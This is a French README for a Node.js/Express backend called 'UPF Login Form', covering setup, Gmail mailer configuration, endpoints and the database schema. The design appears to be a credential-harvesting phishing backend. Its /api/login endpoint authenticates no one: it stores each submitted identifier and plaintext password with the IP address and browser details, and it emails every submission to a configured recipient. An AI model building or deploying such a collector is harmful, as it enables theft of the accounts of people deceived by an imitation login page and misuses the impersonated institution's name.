# Backend - UPF Login Form

Serveur Node.js/Express pour gérer les connexions utilisateur avec MongoDB et notifications par email.

## Installation

1. Naviguez dans le dossier serveur:
```bash
cd server
```

2. Installez les dépendances:
```bash
npm install
```

3. Créez un fichier `.env` basé sur `.env.example`:
```bash
cp .env.example .env
```

4. Configurez les variables d'environnement dans `.env`:
- `MONGODB_URI`: URL de votre base de données MongoDB
- `PORT`: Port du serveur (par défaut 5000)
- `EMAIL_USER`: Votre adresse email Gmail
- `EMAIL_PASSWORD`: Mot de passe d'application Gmail
- `EMAIL_RECIPIENT`: Email destinataire des notifications

## Configuration Gmail

Pour utiliser Nodemailer avec Gmail:

1. Activez l'authentification à deux facteurs sur votre compte Google
2. Générez un [mot de passe d'application](https://myaccount.google.com/apppasswords)
3. Utilisez ce mot de passe dans la variable `EMAIL_PASSWORD`

## Démarrage

### Mode développement (avec rechargement automatique):
```bash
npm run dev
```

### Mode production:
```bash
npm start
```

Le serveur sera accessible sur `http://localhost:5000`

## Endpoints

### POST `/api/login`
Enregistre une tentative de connexion et envoie un email.

**Payload:**
```json
{
  "identifiant": "user@example.com",
  "motDePasse": "password123"
}
```

**Réponse:**
```json
{
  "success": true,
  "message": "Connexion enregistrée avec succès",
  "id": "id_du_document"
}
```

### GET `/api/health`
Vérifie l'état du serveur.

## Base de données

Les données de connexion sont stockées dans la collection `loginattempts` avec les champs:
- `identifiant`: Identifiant utilisateur
- `motDePasse`: Mot de passe
- `ipAddress`: Adresse IP de la requête
- `userAgent`: Informations du navigateur
- `timestamp`: Horodatage de la tentative
- `createdAt`/`updatedAt`: Métadonnées Mongoose

## Structure des fichiers

```
server/
├── models/
│   └── LoginAttempt.js      # Schéma MongoDB
├── services/
│   └── emailService.js      # Service d'email
├── .env.example             # Variables d'environnement (exemple)
├── package.json
└── server.js                # Serveur principal
```
